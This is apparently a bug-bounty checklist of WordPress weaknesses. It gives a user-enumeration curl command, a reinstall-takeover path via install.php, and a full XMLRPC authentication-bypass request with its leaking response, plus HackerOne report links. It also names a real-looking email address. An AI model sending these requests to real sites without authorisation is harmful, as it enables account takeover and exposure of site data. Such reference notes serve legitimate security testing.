# Bugs to check on wordpress
- Data Exposure
- xmlrpc.php Enabled
- Using Wpscan

## Data exposure reports
https://hackerone.com/reports/356047
https://hackerone.com/reports/540301 
https://hackerone.com/reports/384782

### XMLRPC Enabled 
https://hackerone.com/reports/356047 
https://hackerone.com/reports/540301 
https://hackerone.com/reports/384782

# Not Securing wp-config.php WordPress Configuration File
# Takeover Wordpress If Not Installed
```bash
https://example.com/wp-admin/install.php
```
- If you can install wordpress again RCE boom

## Findings
- It Discloses Author And Admin Information
```bash
example.com/wp-json/wp/v2/users/
$ curl https://example.com/\?_method\=GET -d rest_route=/wp/v2/users
```
## OneLogin authentication bypass on WordPress sites via XMLRPC
- Request
```bash
POST /xmlrpc.php
Host: ex.com

<?xml version="1.0"?>
<methodCall>
<methodName>wp.getOptions</methodName>
<params>
	<param><value>zzz</value></param>
        <param><value>cbarry@uber.com</value></param>
        <param><value>@@@nopass@@@</value></param>
</params>
</methodCall>
```
- response
```bash
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <struct>
  <member><name>software_name</name><value><struct>
  <member><name>desc</name><value><string>Software Name</string></value></member>
  <member><name>readonly</name><value><boolean>1</boolean></value></member>
  <member><name>value</name><value><string>WordPress</string></value></member>
</struct></value></member>
  <member><name>software_version</name><value><struct>
  <member><name>desc</name><value><string>Software Version</string></value></member>
  <member><name>readonly</name><value><boolean>1</boolean></value></member>
  <member><name>value</name><value><string>4.4.3</string></value></member>
</struct></value></member>
  <member><name>blog_url</name><value><struct>
  <member><name>desc</name><value><string>WordPress Address (URL)</string></value></member>
  <member><name>readonly</name><value><boolean>1</boolean></value></member>
  <member><name>value</name><value><string>https://newsroom.uber.com</string></value></member>
...etc.
```
##### Exploit scenarios [Check Report](https://hackerone.com/reports/138869)

##### Important Reports To Look AT
```bash
Link: https://hackerone.com/reports/436928
Link: https://hackerone.com/reports/187520
Link: https://hackerone.com/reports/460911
Link: https://hackerone.com/reports/509930
Link: https://hackerone.com/reports/487081
Link: https://hackerone.com/reports/659419
Link: https://hackerone.com/reports/222040
Link: https://hackerone.com/reports/490782
Link: https://hackerone.com/reports/183568
Link: https://hackerone.com/reports/204513
Link: https://hackerone.com/reports/203515
Link: https://hackerone.com/reports/220903
Link: https://hackerone.com/reports/270060
Link: https://hackerone.com/reports/339483
Link: https://hackerone.com/reports/230234
Link: https://hackerone.com/reports/250837
Link: https://hackerone.com/reports/282176
Link: https://hackerone.com/reports/277502
Link: https://hackerone.com/reports/230232
Link: https://hackerone.com/reports/263109
Link: https://hackerone.com/reports/230435
Link: https://hackerone.com/reports/495515
Link: https://hackerone.com/reports/538008
Link: https://hackerone.com/reports/153093
Link: https://hackerone.com/reports/837018
```
